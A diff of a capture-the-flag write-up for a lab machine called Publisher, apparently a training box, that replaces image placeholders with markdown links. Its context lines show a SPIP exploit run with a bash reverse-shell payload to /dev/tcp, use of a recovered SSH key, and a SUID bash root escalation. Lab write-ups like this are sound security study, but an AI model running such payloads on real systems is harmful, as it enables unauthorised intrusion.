@@ -4,7 +4,7 @@
 
 ## Machine info
 
-[IMAGE: Publisher machine card]
+![Publisher machine card](images/01-machine-card.png)
 
 ## Summary
 
@@ -43,11 +43,11 @@ images               (Status: 301) [Size: 313] [--> http://10.64.189.14/images/]
 spip                 (Status: 301) [Size: 311] [--> http://10.64.189.14/spip/]
 ```
 
-[IMAGE: Index of /images]
+![Index of /images](images/02-index-of-images.png)
 
 `/spip/` hosted a `SPIP`-powered blog, identifiable by the branding in its footer:
 
-[IMAGE: SPIP blog homepage]
+![SPIP blog homepage](images/03-spip-blog-homepage.png)
 
 Its page source confirmed the exact version through the generator meta tag:
 
@@ -80,7 +80,7 @@ python3 51536.py -u http://10.64.189.14/spip/ -c 'bash -c "bash -i >& /dev/tcp/1
 [+] Anti-CSRF token found : AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
 ```
 
-[IMAGE: Reverse shell catch — www-data]
+![Reverse shell catch — www-data](images/04-reverse-shell-catch.png)
 
 The shell lacked a TTY and was stabilized before continuing:
 
@@ -135,9 +135,9 @@ chmod 600 id_rsa
 
 Using this key to authenticate as `think` over `SSH` confirmed access and recovered the user flag:
 
-[IMAGE: SSH login as think]
+![SSH login as think](images/05-ssh-login-think.png)
 
-[IMAGE: user.txt flag]
+![user.txt flag](images/06-user-flag.png)
 
 ## 4. Privilege Escalation via SUID run_container Script Hijack — Root Flag
 
@@ -273,9 +273,9 @@ Invoking that copy with `-p`, which stops `bash` from dropping the elevated priv
 /var/tmp/bash -p
 ```
 
-[IMAGE: root shell]
+![root shell](images/07-root-shell.png)
 
-[IMAGE: root.txt flag]
+![root.txt flag](images/08-root-flag.png)
 
 ## Root Cause & Remediation
 
